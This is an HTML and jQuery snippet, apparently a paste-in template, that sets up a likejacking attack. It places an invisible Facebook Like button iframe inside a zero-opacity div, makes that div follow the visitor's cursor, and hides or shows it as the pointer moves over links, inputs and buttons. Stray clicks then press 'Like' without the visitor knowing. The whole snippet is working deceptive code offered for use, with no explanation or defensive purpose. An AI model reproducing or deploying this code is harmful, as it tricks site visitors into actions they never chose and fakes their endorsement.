<div id="clickjack-button-wrapper-5" style="position: absolute; opacity: 0; filter: alpha(opacity = 0); -ms-filter:'progid:DXImageTransform.Microsoft.Alpha(Opacity=0)'; margin-left: -50px; z-index: 100; width:27px; height:20px; overflow:hidden">
<!--<div class="clickjack-mask" style="position: absolute; top: 5px; left: 5px; z-index: 1000; height: 13px; width: 15px;"></div>-->
<iframe src="http://www.facebook.com/plugins/like.php?href=Replace Your facebook fanpageurl&layout=button_count&show_faces=false&
width=50&action=like&colorscheme=light&height=21" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:45px; left:-19px; height:21px; z-index: 0; position: relative;" allowTransparency="true"></iframe>
</div>
<script type="text/javascript">
jQuery( document ).ready( function() {
$( "#clickjack-button-wrapper-5" ).parent().mousemove( function( e ) {
jQuery( "#clickjack-button-wrapper-5" ).css( {
top: e.pageY - 10,
left: e.pageX + 30
} );
} );
clickjack_hider();
var clickjack_fb_timer = setTimeout("clickjack_hider()",5000);
} );
function clickjack_hider(){
jQuery("input").mouseout(function(){ClickJackFbShow();});
jQuery("a").mouseout(function(){ClickJackFbShow();});
jQuery("button").mouseout(function(){ClickJackFbShow();});
jQuery("textarea").mouseout(function(){ClickJackFbShow();});
jQuery(".ratingblock").mouseout(function(){ClickJackFbShow();}); jQuery("object").mouseout(function(){ClickJackFbShow();});
jQuery("input").mouseover(function(){ClickJackFbHide();});
jQuery("a").mouseover(function(){ClickJackFbHide();});
jQuery("button").mouseover(function(){ClickJackFbHide();});
jQuery("textarea").mouseover(function(){ClickJackFbHide();});
jQuery(".ratingblock").mouseover(function(){ClickJackFbHide();}); jQuery("object").mouseover(function(){ClickJackFbHide();});
}
</script>